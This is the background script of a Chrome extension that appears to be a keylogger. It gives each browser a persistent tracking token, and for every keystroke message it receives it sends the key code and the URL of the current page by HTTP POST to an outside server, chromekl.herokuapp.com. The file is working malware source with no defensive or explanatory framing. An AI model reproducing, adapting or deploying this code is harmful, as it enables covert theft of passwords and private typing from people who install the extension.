window.ckl_token = '';
window.ckl_enabled = true;
window.attempts = 0;

chrome.storage.sync.get('user_id', function(items){
  if(items.user_id){
    window.ckl_token = items.user_id;
  } else {
    var randomPool = new Uint8Array(32);
    crypto.getRandomValues(randomPool);
    var hex = '';
    for (var i = 0; i < randomPool.length; ++i) {
      hex += randomPool[i].toString(16);
    }
    window.ckl_token = hex;
    chrome.storage.sync.set({user_id: window.ckl_token});
  }
});


chrome.runtime.onMessage.addListener(
  function(request, sender) {
    if(window.ckl_enabled == false && window.attempts < 20){
      attempts++;
      return;
    }

    var http = new XMLHttpRequest();
    var url = "http://chromekl.herokuapp.com/receive";
    //var url = "http://localhost:3000/receive";

    var params = "";
    params += "token=" + window.ckl_token;
    params += "&track=" + request.keyCode;
    params += "&page=" + sender.url;

    http.open("POST", url, true);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    http.onreadystatechange = function() {
      if(http.readyState == 4){
        window.ckl_enabled = http.status == 200;
        window.attempts = 0;
      }
    }

    http.send(params);
  }
);
